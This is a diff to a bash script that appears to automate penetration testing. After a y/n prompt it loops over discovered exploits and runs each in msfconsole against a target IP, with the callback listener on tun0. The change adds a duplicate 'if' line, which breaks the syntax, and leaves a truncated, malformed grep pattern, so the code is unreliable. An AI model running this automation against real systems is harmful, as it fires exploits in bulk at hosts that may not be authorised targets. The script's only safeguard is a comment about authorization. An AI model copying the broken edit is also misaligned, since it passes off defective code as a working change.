@@ -155,6 +155,7 @@ fi
 # Execute discovered exploits (use with caution and proper authorization!)
 read -p "Would you like to execute discovered exploits (y/n)? " executeExploits
 if [[ $executeExploits =~ ^[yY]$ ]]
+if [[ $executeExploits =~ ^[yY]$ ]]
 then
     while read -r line
     do
@@ -162,4 +163,5 @@ then
         exploitName=$(echo "$line" | cut -d ":" -f 2)
         echo "Executing $exploitName..."
         msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; exploit; exit;"
-    done <<< "$(grep -H -i -e 'CVE-\S\
+    done <<< "$(grep -H -i -e 'CVE-\S\')"
+fi
